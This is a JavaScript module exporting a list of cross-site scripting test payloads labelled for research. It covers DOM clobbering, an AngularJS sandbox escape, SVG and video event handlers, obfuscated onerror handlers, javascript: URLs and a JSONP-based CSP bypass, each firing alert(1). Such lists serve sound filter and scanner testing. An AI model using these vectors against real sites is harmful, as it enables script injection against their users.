// Advanced XSS payloads for research
module.exports = [
  // DOM Clobbering attacks
  '<form id="test"><input id="nodeType"><input name="firstChild"><input name="nodeName"></form>',
  
  // AngularJS sandbox escapes (for applications using Angular)
  '{{constructor.constructor("alert(1)")()}}',
  
  // CSS-based attacks
  '<div style="background-image: url(javascript:alert(1))">CSS Attack</div>',
  
  // SVG-based attacks
  '<svg><animate onbegin="alert(1)" attributeName="x"></animate></svg>',
  
  // Obfuscated attacks
  '<img src onerror="\u0061\u006c\u0065\u0072\u0074(1)" />',
  
  // Mutated XSS
  '<a href="javascript&colon;alert(1)">Click me</a>',
  
  // HTML5 vector using video tag
  '<video><source onerror="alert(1)">',
  
  // Dangling markup injection
  '"><img src=x onerror=alert(1)>',
  
  // CSP bypass using JSONP
  '<script src="https://some-jsonp-endpoint?callback=alert(1)"></script>'
];